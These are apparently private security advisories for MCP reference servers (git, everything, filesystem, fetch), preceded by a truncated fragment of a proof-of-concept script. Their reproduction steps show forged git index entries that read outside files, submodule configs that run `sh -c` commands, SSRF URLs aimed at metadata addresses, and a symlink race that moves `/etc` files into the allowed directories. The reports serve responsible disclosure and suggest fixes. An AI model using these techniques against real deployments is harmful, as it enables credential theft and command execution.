MARK=$(head -c16 /dev/urandom | od -An -tx1 | tr -d ' \n')

# The server runs git merge itself, so it needs a committer identity in the
# trusted scope or it aborts before ever consulting the merge driver.
git config --global user.email poc@example.com
git config --global user.name poc
git config --global init.defaultBranch main
G="git -c user.email=poc@example.com -c user.name=poc"

# ----------------------------------------------------------------------------
# MCP client: talks JSON-RPC to mcp-server-git over stdio and prints one line
# describing the tool's response, so the caller can see what it was told.
# ----------------------------------------------------------------------------
cat > /tmp/client.py <<'PY'
import json, subprocess, sys

args = json.loads(sys.argv[1])          # server args, e.g. [] or ["--repository", path]
calls = json.loads(sys.argv[2])         # [[tool_name, arguments], ...]

proc = subprocess.Popen(["mcp-server-git", *args], stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

def send(message):
    proc.stdin.write(json.dumps(message) + "\n")
    proc.stdin.flush()

def receive(request_id):
    while True:
        line = proc.stdout.readline()
        if not line:
            return {"error": "server closed"}
        message = json.loads(line)
        if message.get("id") == request_id:
            return message

send({"jsonrpc": "2.0", "id": 0, "method": "initialize",
      "params": {"protocolVersion": "2025-11-25", "capabilities": {},
                 "clientInfo": {"name": "poc", "version": "1"}}})
receive(0)
send({"jsonrpc": "2.0", "method": "notifications/initialized"})

for index, (tool, arguments) in enumerate(calls, start=1):
    send({"jsonrpc": "2.0", "id": index, "method": "tools/call",
          "params": {"name": tool, "arguments": arguments}})
    reply = receive(index)
    result = reply.get("result", reply)

A plain `git clone` does not carry `.git/config`, so cloning is not a delivery path.

description:
## Summary

With `--repository` set, the server checks the directories git opens (working tree, git directory, common directory), alternate object stores and symbolic links in the git directory. It does not check the paths listed in `.git/index`. Git reads an index entry such as `../outside/secret` relative to the working tree, without refusing it, so `git_diff_unstaged` and `git_diff` return the full content of any file the server's user can read, outside the allowed repository. `git_status` returns the paths and tells whether each one exists.

No symbolic link, no alternates, no configuration key is involved: one binary `index` file and the empty blob in `objects/`.

This is a separate root cause from GHSA-rq8c-g4wx-m2h2, which we reported on 2026-11-14 (see "Relation to other advisories", including what this report does NOT add while rq8c is open).

## Server and version

- Server: `git` (`src/git`), package `mcp-server-git` on PyPI.
- Version: **2026.11.11** (latest on PyPI on 2026-11-15, the release that carries the fix for GHSA-q74p-4wrc-q7w6). `__init__.py`, `__main__.py` and `server.py` in the published wheel are byte-identical to `main` at e1dc4b1.
- `v2/main` at e1d154e: read only, not run. `validate_opened_repo` and `_check_git_dir_contents` are identical there.
- Weakness: CWE-22, same class as GHSA-q74p-4wrc-q7w6 and GHSA-w766-5x43-whvw.

## Configuration and client

- Default install from PyPI in a fresh virtualenv: GitPython 3.2.1, `mcp` SDK 2.3.0, Python 3.13, git 2.53.0, macOS.
- Server started over stdio with `--repository <workspace>`, no other argument, no environment variable.
- Client: a minimal stdio MCP client written for the test (standard library only), which sends `initialize` and one `tools/call` per server process. No real MCP host was used.

## Root cause

`src/git/README.md:176-179` states the boundary under `--repository`: a tool call's `repo_path` must be inside the allowed repository, "and so must the directories Git then uses for it", and the server refuses a git directory that names alternates or holds a symbolic link resolving outside. The advisory GHSA-q74p-4wrc-q7w6 describes its fix as closing "both bypasses in this report and the class around them".

The docstring of `_check_git_dir_contents` (`src/git/src/mcp_server_git/server.py:803`) gives the rule: "Refuse what in a git directory leads git outside the allowed repository."

`.git/index` leads git outside the allowed repository, and nothing checks its content:

- `validate_opened_repo` (`server.py:723-789`) checks the working tree, git directory and common directory reported by `rev-parse` and GitPython, then calls `_check_git_dir_contents` (`server.py:797`), which looks for alternates and walks symbolic links. Neither reads the entries of the index.
- The index is a list of paths. `git add` and `git update-index` refuse a path with a `..` component, but when git READS the index, it does not check the entries again. `git diff` (index against working tree) and `git diff <commit>` read each entry's file relative to the working tree, so an entry `../outside/secret` is read from outside the repository and its content comes back in the diff.
- `git_add` has its own guard against `..` (`server.py:393`, the fix for GHSA-vjqx-cfc4-9h6v), but a forged index never goes through `git_add`.

Call path: `open_repo` (`server.py:1207-1215`) → `validate_opened_repo` (passes) → `git_diff_unstaged` (`server.py:233`), `git_diff` (`server.py:278`) or `git_status` (`server.py:229`).

## Steps to reproduce

Everything is local. Witness files hold fake data. The only network traffic is installing the package from PyPI. The complete script and the client are embedded at the end of this section. One server process per tool call, server always started with `--repository "$WS"`.

1. Create files outside the allowed repository: `$WORK/outside/witness.txt` (`WITNESS-OUTSIDE-<token>`) and `$WORK/elsewhere/.ssh/id_fake` (a fake key).
2. Create the allowed repository `$WORK/workspace` with one commit.
3. Replace `$WORK/workspace/.git/index` with an index version 2 whose entries are `../outside/witness.txt`, `../elsewhere/.ssh/id_fake`, `../outside/absent.txt` and `README.txt`, each pointing at the empty blob. Write the empty blob with `git hash-object -w --stdin </dev/null`.
4. Call `git_diff_unstaged`, `git_diff` (target `HEAD`) and `git_status` with `repo_path` = the allowed repository.
5. Do the same with a repository vendored inside the allowed one (`workspace/vendor/lib`) whose index holds `../../../outside/witness.txt`.

| # | Case | Tool | Result |
|---|---|---|---|
| C1 (control) | untouched repository | `git_diff_unstaged` | empty diff |
| C2 (control) | nested repository with `objects/info/alternates` | `git_status` | refused, "alternate object stores are not allowed with --repository": confinement is active |
| T1 | forged index in the allowed repository | `git_diff_unstaged` | `isError=False`, full content of both files outside the repository |
| T2 | same | `git_diff`, target `HEAD` | `isError=False`, full content of both files |
| T3 | same | `git_status` | the outside paths are listed, and the missing one shows as `deleted:` (existence oracle) |
| T4 | forged index in a repository vendored inside the allowed one | `git_diff_unstaged` | `isError=False`, full content of the witness |

## Impact

With `--repository` set, the full content of any file the server's user can read (SSH keys, `.env` files and tokens next to the workspace, other projects), returned by tools annotated read-only (`git_diff_unstaged`, `git_diff`), which a client may run without asking the user. The content lands in the model's context. `git_status` adds an existence oracle for arbitrary paths. There is no write and no command execution: we checked that git refuses to commit or check out such entries.

Condition: the attacker controls the content of a `.git` directory that the server opens under `--repository`. That happens with the allowed repository received with its `.git` as is (an unpacked archive, a shared folder, a copy made by an agent), or with a repository vendored inside it (T4). This is the condition of GHSA-6hqx-gqrx-c5r2. `--repository` is the setting the README recommends "whenever the server is used with prompts or content that are not fully trusted", which is the case where a hostile repository is expected.

Our severity estimate, approximate: Medium, about CVSS 3.1 5.5 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N), in line with the rating of GHSA-q74p-4wrc-q7w6 and GHSA-w766-5x43-whvw.

## Relation to other advisories

- **GHSA-q74p-4wrc-q7w6** (https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-q74p-4wrc-q7w6), fixed in 2026.11.11. Same function (`validate_opened_repo` / `_check_git_dir_contents`), same boundary, same rule in the docstring. That fix covers the files of a git directory that redirect git (alternates, symbolic links). The index is not a redirection: it is a list of paths that git follows unchecked. This report is a gap in the class that fix aims to close.
- **GHSA-rq8c-g4wx-m2h2** (https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-rq8c-g4wx-m2h2), reported by us on 2026-11-14, a program named by the repository's configuration still runs on read-only tools. **Separate root cause**: there, configuration keys that `harden_repo` does not override; here, index entries that `validate_opened_repo` does not check. Separate boundary: there, "the server never runs a program they name", with or without `--repository`; here, the `--repository` confinement. Separate fix.
- **What this report does not add while GHSA-rq8c-g4wx-m2h2 is open.** Both need the same thing: an attacker who controls a `.git` directory the server opens. As long as rq8c is not fixed, that attacker can already run a command and so read these files. Until then, this report gives the attacker nothing more. It matters once rq8c is fixed, as a separate way around a boundary the README states on its own.
- GHSA-vjqx-cfc4-9h6v: the `..` guard of `git_add` does not apply, since a forged index never goes through `git_add`.

## Limits of what we tested

- macOS and git 2.53.0 only. Linux, Windows, the Docker image and other git versions were not tested.
- `v2/main` was read, not run.
- No real MCP client: the test client is minimal, over stdio.

summary: mcp-server-git: a submodule's own configuration still runs programs on `git_diff` (with `diff.submodule=diff`) and on `git_checkout` / `git_add`
description:
**Affected:** `mcp-server-git` 2026.11.11 (release v2.4.0), the latest release. Tested with git 2.53.0 and GitPython 3.2.1 on macOS.

### Summary

The README says the server "never runs a program" a repository's configuration names, and that `git_status`, `git_diff_unstaged` and `git_diff` pass `--ignore-submodules=dirty` "because looking for changes inside a submodule runs Git under the submodule's own configuration". GHSA-6hqx-gqrx-c5r2 closed the dirty-submodule look for status and diff. Two other paths still run git inside a submodule under the submodule's own `.git/config`, which `harden_repo` never reads:

1. **Diff tools, read-only.** If the repository's configuration sets `diff.submodule=diff`, `git diff` runs a nested `git diff` inside each changed submodule. That nested command does not get `--no-ext-diff --no-textconv`, so the submodule's `diff.external` (or a textconv driver chosen by its `.gitattributes`) runs. Reached by `git_diff`, `git_diff_staged` and `git_diff_unstaged`. `git_show` is not affected.
2. **`git_checkout` and `git_add ["."]`.** Neither passes a submodule flag. Git looks inside the submodule's working tree and runs the `filter.<name>.clean` command its configuration defines. `git_status`, `git_diff_staged`, `git_reset` and `git_create_branch` are not affected.

A gitlink is enough; no `.gitmodules` entry is needed. The existing test `test_submodule_configuration_is_not_reached` covers only `git_status` and `git_diff_unstaged` without `diff.submodule`.

### Reproduction

Common setup:

```sh
R=/tmp/mcp-git-demo-2 && mkdir "$R" && cd "$R"
git init -q allowed && cd allowed
echo one > f.txt && git add f.txt && git commit -qm first
git init -q sm
( cd sm && echo a > g.txt && echo '*.txt filter=evil' > .gitattributes \
  && git add . && git commit -qm one )
git add sm && git commit -qm "add sm"
```

**Path 1 (diff):**

```sh
( cd sm && echo b > g.txt && git commit -qam two )
git add sm && git commit -qm "bump sm"
git config diff.submodule diff
git -C sm config diff.external "sh -c 'echo extdiff >> $R/MARKER' x"
```

Start the server with `--repository "$R/allowed"` and call `git_diff` with `target` `HEAD~1`.

- **Actual:** the result is `Submodule sm <a>..<b>:` and `$R/MARKER` contains `extdiff`.
- **Control:** without the `diff.external` line the tool prints the submodule's inline diff and writes no marker.

**Path 2 (checkout), from the common setup:**

```sh
git branch same
git -C sm config filter.evil.clean "sh -c 'echo clean >> $R/MARKER; cat' x"
touch -t 200301010000 sm/g.txt
```

Call `git_checkout` with `branch_name` `same`.

- **Actual:** "Switched to branch 'same'" and `$R/MARKER` contains `clean`. `git_add` with `files: ["."]` does the same.
- **Control:** without the filter line, no marker.

**Expected in both:** nothing the repository or its submodule names is run.

Result over three fresh repositories and fresh server processes for each path: marker written 3 of 3 with the configuration, 0 of 3 in each control. The payload only appends a word to a file inside the temporary directory.

### Suggested fix

- **Path 1:** add `("diff.submodule", "short")` to `HARDENED_CONFIG`. The command-scope override outranks the repository's value, so the nested diff never starts and the submodule is reported as a changed commit, as it is today without the setting.
- **Path 2:** the `GIT_CONFIG_COUNT` overrides are inherited by the git that runs inside the submodule, so the existing by-name driver override works there too once the names are known. In `harden_repo`, also list `_LISTED_KEYS` in each checked-out repository found at a gitlink in the index (following nested gitlinks), and add those drivers to the emptied set. This keeps `git_add ["."]` staging a moved submodule commit, which excluding submodule paths would not.

With both changes in place, calls through the server no longer write the marker on any of the five tool calls above, nor for a submodule inside a submodule, and the full test suite passes. I have the patch against v2.4.0 with regression tests for each path. I understand changes here are normally re-derived through your own workflow, so I have not opened a PR; I can paste the diff into this thread if useful.

### Severity (suggestion; yours to set)

`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` (7.8), the same vector as GHSA-6hqx-gqrx-c5r2. Path 1 needs one extra setting in the parent repository's configuration and is reached by read-only tools; path 2 is reached by two tools that write. CWE-15 leading to command execution.

### Notes

This was found with AI-assisted code analysis and an automated test harness, and reproduced on the published 2026.11.11 package before reporting.

On disclosure: I will follow your process and not discuss this publicly before the advisory is published. I may later include an anonymised, class-level description in an academic paper and am happy to coordinate timing.

Credit: Yusef Syed

summary: server-everything: gzip fetch SSRF guard still treats the NAT64 well-known prefix (64:ff9b::/96) as public — the instance of the class fixed for fetch in GHSA-66qx-2266-pmj6 remains in the second guard implementation
description:
### Summary

This is a precedent-consistency report, not a novel class: the identical NAT64 well-known-prefix gap in the sibling fetch server's SSRF guard was accepted by this repository, published as GHSA-66qx-2266-pmj6, and fixed in v2.1.0 (#5238).

The everything server's gzip fetch guard (tools/gzip-file-as-resource.ts) still classifies addresses in 64:ff9b::/96 as public, because the prefix is never unwrapped to the embedded IPv4 before the block-list check.

Impact is contingent on a NAT64/DNS64 path that can actually reach the embedded IPv4; on ordinary networks the connection simply fails. The code comment in the guard already acknowledges the gap (disclosed below).

### Details

Affected: Product @modelcontextprotocol/server-everything (modelcontextprotocol/servers, src/everything). Confirmed in monorepo v2/main at commit 6cfff622fb8eb41e2504340d5a6105d34094143c (2026-11-11). Precedent: mcp-server-fetch in this same repository — GHSA-66qx-2266-pmj6 (originally reported as issue #5181), fixed in v2.1.0 (2026-10-24) via #5238 and tracked by maintainer in #5255. Other versions not verified.

Details:
- src/everything/tools/gzip-file-as-resource.ts (line numbers at pinned commit): guard's block list registers the local-use NAT64 range (64:ff9b:1::/48, L96) but not the well-known prefix; assertPermittedTarget (L285-311) checks every address returned by lookup(host, { all: true }) (L302) against that block list, so an address of form 64:ff9b::<embedded IPv4> is always classified as public.
- Disclosure of in-code self-admission: comment at L70-72 already states, "The well-known NAT64 prefix (64:ff9b::/96) is not unwrapped and so passes as public." This report does not present the gap as newly discovered in principle; it reports that an acknowledged gap in a comment remains unfixed in code while the identical gap in the sibling guard was treated as a vulnerability, published, and fixed. (Unlike fetch's case, nothing in the everything README or features documentation mentions NAT64 to users.)
- Mechanism: (1) a client passes gzip-file-as-resource tool a URL such as http://[64:ff9b::a9fe:a9fe]/ (embedding of 169.254.169.254); for an IP-literal host the resolver returns the address itself; (2) allowlist and private-address checks pass, because checked address is NAT64 form and classified public; (3) fetch is attempted, and where a NAT64 translator sits on the path, connection is translated to embedded IPv4. In DNS64 environments an ordinary hostname can also produce this address form via synthesized AAAA records.
- This is NOT the DNS-rebinding window the README documents for this guard: there, a name re-resolves between check and connect. Here the address checked is itself the NAT64 form and is misclassified at check time; translation happens in network, not by re-resolution. The documented limitation is therefore not claimed as part of this report.

### Proof of concept

Established by code inspection against pinned tree. Classification outcome follows deterministically from guard's contents: with 64:ff9b::/96 absent from every registered non-public range, assertPermittedTarget accepts a target whose resolved address lies in that prefix, including embeddings of RFC 1918 and link-local IPv4 addresses. A unit-level exercise of the classifier mirrors the proof accepted for the fetch precedent. End-to-end connection was NOT dynamically demonstrated: no NAT64/DNS64 environment was available, and on a network without one the connection attempt simply fails.

Appendix regression test (ev-k03-1_gzip-nat64-classification.test.ts, style of existing __tests__/gzip-private-addresses.test.ts): pins NAT64 address judged by wrapped IPv4 — embeddings of private/loopback/link-local refused, public embedding not refused for prefix alone. Verification (Node v24.22.1 / vitest 4.1.10, pinned tree): test FAILS on pinned code — 5 of 7 cases fail, tool fetched NAT64 target and returned resource_link instead of refusal (2 public controls pass). With remediation on scratch copy (unwrap 64:ff9b::/96 and classify embedded IPv4, mirroring #5238), test PASSES 7/7, existing gzip suites stay green 41/41. Test exercises classification only — DNS and fetch stubbed, no real NAT64 gateway. Full test source in reporter's evidence files, available on request.

### Impact

Only in deployments where everything server runs with a NAT64/DNS64 path to internal address space: a client able to call gzip fetch tool can make server connect to embedded IPv4 targets — including private and link-local addresses — that guard is documented to refuse by default. No impact on ordinary networks.

Remediation: Mirror fetch fix (#5238) in gzip guard: unwrap 64:ff9b::/96 before classification and subject embedded IPv4 to same block-list check (local-use range 64:ff9b:1::/48 is already registered; well-known prefix needs unwrap-and-check rather than flat block, so public embedded addresses keep working where NAT64 is intended path).

Honest limitations:
- Class novelty is zero: same defect class reported by third party (#5181), published (GHSA-66qx-2266-pmj6), fixed for fetch. Contribution is limited to identifying surviving instance in second guard implementation.
- Exploitation contingent on NAT64/DNS64 infrastructure; reporter could not and did not demonstrate a completed connection.
- No testing against any third-party or production deployment.

Reporter credit: Tomoki Murota, CISSP

summary: server-filesystem: `move_file`'s same-device rename leaves the source unpinned — a swapped source parent moves an outside file into the allowed directories, where it becomes readable
description:
### Summary

The `move_file` handler validates both its source and destination. For a same-device move, however, only the destination parent is pinned: `renameIntoDirectory` passes the **source** to `fs.renameSync` as an absolute string, which the kernel resolves at rename time — after validation. A local process that swaps a parent component of the source path for an outside-pointing symlink in that window causes the rename to move the *outside* file into the pinned destination inside the allowed directories, after which every read tool returns its contents: an out-of-bounds read achieved through move.

This is also an internal inconsistency in the component: the same operation's cross-device fallback (`moveFileAcrossDevices`) and `copy_file` both open the source through `openSourceInDirectory` — anchored at the source's own parent, lstat-checked, opened with `O_NOFOLLOW`, and identity-verified. Only the same-device rename leaves the source unpinned.

### Details

Affected product / versions:
- Product: @modelcontextprotocol/server-filesystem (modelcontextprotocol/servers, `src/filesystem`)
- Confirmed version: v2.2.0, monorepo commit `36380287ed3b15d115b55f546617d723072b1296`
- Other versions: not verified. No claim is made about other versions.

Severity:
- Reporter's estimate (based on local reproduction against the real code, not a CNA assignment): CVSS v3.1 5.3 (Medium)
- Vector: `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N`
- CWE (proposed): CWE-367 (Time-of-check Time-of-use (TOCTOU) Race Condition) — the source path is validated and then handed to `fs.renameSync` as a string, which the kernel resolves at rename time; a component swapped in the window redirects the move. (The resulting escape from the restricted directory is of the CWE-22 class; the defect itself is the check-to-use race on the source, as in the read-path issue.)
- Justification: as with the read-path race in the same component, exploitation requires a cooperating local process with write access inside an allowed directory, winning the window between validation and the rename — hence local vector and high complexity. A successful swap moves an arbitrary outside file into the allowed set (confidentiality High once it is read back; integrity Low because the file is removed from its original location).

Details:
- `src/filesystem/pinned-directory.ts:325-336` (`renameIntoDirectory`), called from `lib.ts:690-700` (`moveFile`); the handler validates the source at `server.ts:909` and the destination at `server.ts:913`:
```
/**
 * Rename `sourcePath` (absolute, outside this fix's scope) to the final
 * component of `destinationPath`, relative to its anchored directory.
 */
export function renameIntoDirectory(
  sourcePath: string,
  destinationPath: string,
): void {
  inDirectory(path.dirname(destinationPath), () =>
    fs.renameSync(sourcePath, path.basename(destinationPath)),
  );
}
```
- On the doc comment's "outside this fix's scope": we read that as a scoping note about the earlier pinning change, not as a security acceptance of this gap — the same operation's other two paths (cross-device move, copy) pin the source, which indicates the source side is within the component's own security model, and the comment predates any analysis of the rename resolving a swapped source. We raise it so the maintainers can judge; if the scope note was intended as acceptance, the inconsistency with the sibling paths is still worth recording.
- Mechanism: (1) both arguments validate; the source's realpath is inside the allowed set at that moment; (2) `moveFile` requires the destination to be absent and calls `renameIntoDirectory`; (3) the destination parent is anchored via `inDirectory`, but the source string is resolved by the kernel at rename time; (4) a swapped source parent redirects the resolution outside; (5) the outside file lands inside the allowed set and becomes readable by all read tools. On POSIX the destination pin means the file always lands **inside** (import, not export). On Windows the destination anchor itself is the subject of a separate, statically-supported observation (write-path pinning is weakened there); any export form of this issue depends on that observation and is not claimed here.

Honest limitations:
- Reporter confidence in the underlying records is Low-to-Medium: the mechanism is code-certain and harness-reproduced, but exploitation needs the local-racer precondition and a won race window.
- The Windows export variant depends on a separate statically-supported observation about Windows write-path pinning that has not been dynamically verified on a Windows host; this report claims only the POSIX import form.
- No testing was performed against any third-party or production deployment.

Remediation direction:
Pin the source for the rename path as the sibling paths already do: open/anchor the source through `openSourceInDirectory`-equivalent machinery (anchored at the source's parent, identity-checked), or perform the rename relative to pinned directory handles for both ends (e.g. `renameat`-style with verified descriptors where the platform allows).

Reporter credit: Tomoki Murota, CISSP

### Proof of concept

Reproduction was performed locally against the real server code with the same harness family used for the read-path race (`mc1_filesystem/verify/`): the source's parent component was swapped for an outside-pointing symlink in the window between the handler's validation and the rename, and the outside file was moved into the allowed directory and subsequently read through the server (evidence: `mc1_filesystem/FINDINGS_A.md` Candidate 4; the finding survived an independent adversarial review, which examined and rejected the "out of scope by design" reading on the grounds above).

Illustrative trigger: `move_file {source: "/allowed/sub/important.conf", destination: "/allowed/stolen.conf"}` with `/allowed/sub` swapped for a symlink to `/etc` in the window: `/etc/important.conf` is moved into the allowed set and becomes readable.

### Impact

A file outside the allowed directories can be moved inside them and read in full (POSIX form). The operation also deletes the file from its original location. The client's own tools cannot set up the swap; the cooperating-local-process precondition is the same one the component's write-path pinning already assumes.

summary: mcp-server-fetch: IPv6 site-local fec0::/10 classified as public (SSRF guard classifier gap, CWE-918)
description:
### Summary

_is_public_address in mcp-server-fetch omits fec0::/10 (deprecated IPv6 site-local) and ::ffff:0:0/96 from its non-public list and falls back to ip.is_global, which returns True for fec0::1. A fetch to http://[fec0::1]/ passes the SSRF guard. Low real-world reachability on default hosts; this is a classifier-correctness gap, not a proven metadata exploit.

### Details

**Server:** fetch (`mcp-server-fetch`, PyPI)
**Affected versions:** 2026.11.4 and 2026.10.24 (reproduced on both)
**CWE:** CWE-918 (SSRF — guard classifier gap)

### Summary
`_is_public_address` (`src/mcp_server_fetch/server.py`) unwraps IPv4-mapped and well-known NAT64 forms and lists many non-public ranges, but omits `fec0::/10` (deprecated IPv6 site-local, RFC 3879) and `::ffff:0:0/96` (IPv4-translated). It then falls back to `return ip.is_global and not ip.is_multicast`, and Python's `ipaddress` reports `fec0::1` as `is_global == True`. So a `fetch` to `http://[fec0::1]/…` passes the guard that is meant to refuse non-public destinations.

### Scope / honest reachability note
This is a guard-classifier correctness issue — the guard's own threat model includes non-public destinations — **not** a proven metadata-service exploit on default hosts. On a stock modern kernel `fec0::1` usually has no route and the connection times out; the translated loopback form `[::ffff:0:127.0.0.1]` was correctly normalized and blocked. Every other loopback / RFC1918 / link-local / redirect form in a 36-case matrix (2-hop, protocol-relative, 307/308, userinfo, trailing-dot and uppercase-host redirects, `0.0.0.0`, `[::]`, full-octal IPv4, mapped / NAT64) was correctly refused.

### Impact
The SSRF allowlist classifies a non-public (site-local) IPv6 destination as public. Severity is Low given the limited default-host reachability; it is a defense-in-depth / correctness gap in a guard whose purpose is to deny non-public destinations.

### Suggested fix
Explicitly block `fec0::/10` and `::ffff:0:0/96`; deny-by-default on `not ip.is_global` combined with reserved / site-local checks rather than relying on `is_global` alone.

### Disclosure
Reported privately per SECURITY.md. Analysis and drafting were AI-assisted and reviewed by a human researcher at ShieldPi. Credit, if accepted: ShieldPi (support@shieldpi.io).

### Proof of concept

1. Classifier level (2026.11.4 and 2026.10.24):
   python -c "from mcp_server_fetch.server import _is_public_address as f; print(f('fec0::1'))"
   -> prints True (should be False).
2. End-to-end: call fetch {"url":"http://[fec0::1]/admin"} -> the host passes the public-address guard. On a stock host with no route to fec0::/10 the TCP connection then times out; on a host that routes fec0::/10 the request proceeds to the non-public destination.
3. Negative controls (correctly refused): http://[::ffff:0:127.0.0.1]/ , http://0.0.0.0/ , http://[::]/ , and 2-hop / 307 / 308 redirects into loopback or RFC1918.
Reproduced on mcp-server-fetch 2026.11.4 and 2026.10.24.

### Impact

The SSRF guard classifies a non-public IPv6 site-local address (fec0::1) as a public destination, so a fetch to it bypasses the guard. Real-world reachability is low on default hosts (no route to fec0::/10); impact is a classifier-correctness / defense-in-depth gap, not a proven metadata-service read. Affects any deployment relying on mcp-server-fetch's address guard to refuse non-public destinations.
